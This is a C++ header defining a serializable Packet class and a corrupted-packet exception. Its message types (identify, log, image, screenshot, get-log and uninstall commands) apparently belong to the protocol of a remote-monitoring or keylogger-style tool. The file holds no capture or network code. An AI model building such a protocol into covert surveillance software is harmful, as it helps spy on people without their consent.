//
// Created by baptiste on 9/29/17.
//

#include <deque>
#include <iostream>
#include <stdint.h>
#include "Serial.hpp"

#ifndef SPIDER_PACKET_HPP
# define SPIDER_PACKET_HPP

class PacketCorrupted : public std::exception
{
  public:
    PacketCorrupted(const std::string &error_msg) : _msg(error_msg) {}
    const std::string what() throw() {
      return "Packet corrupted : " + _msg;
    };
  private:
    std::string 	_msg;
};

class Packet
{
  public:
    enum PacketType : int {
      SERVER_RESPONSE		= 0,
      IDENTIFY 			= 1,
      LOG 			= 2,
      IMG			= 3,
      COMMAND_STOP		= 4,
      COMMAND_GETLOG		= 5,
      COMMAND_SCREENSHOT	= 6,
      COMMAND_UNINSTALL		= 7,

      EMPTY			= -1,
    };

  public:
    Packet() : _type(EMPTY) {};
    ~Packet() = default;

    void 	clear() { _type = EMPTY; _data = {}; }
    void 	setPacketType(const PacketType pT) { _type = pT; }

    std::string 		getData()
    {
      if (_data.empty())
	throw PacketCorrupted("Missing data");
      std::string		data = _data.front().data();

      _data.pop_front();
      return data;
    }
    PacketType 			getType() const { return _type; }


    template <typename T>
    Packet	&operator<<(const T &data)
    {
      _data.push_back(Serial::serializeData(data));
      return (*this);
    }

  private:
    friend class boost::serialization::access;

    template<class Archive>
    void serialize(Archive &ar, const unsigned int)
    {
      ar & _type;
      ar & _data;
    }

  private:
    PacketType 			_type;
    std::deque<std::string>	_data;
};

#endif /* !SPIDER_PACKET_HPP */
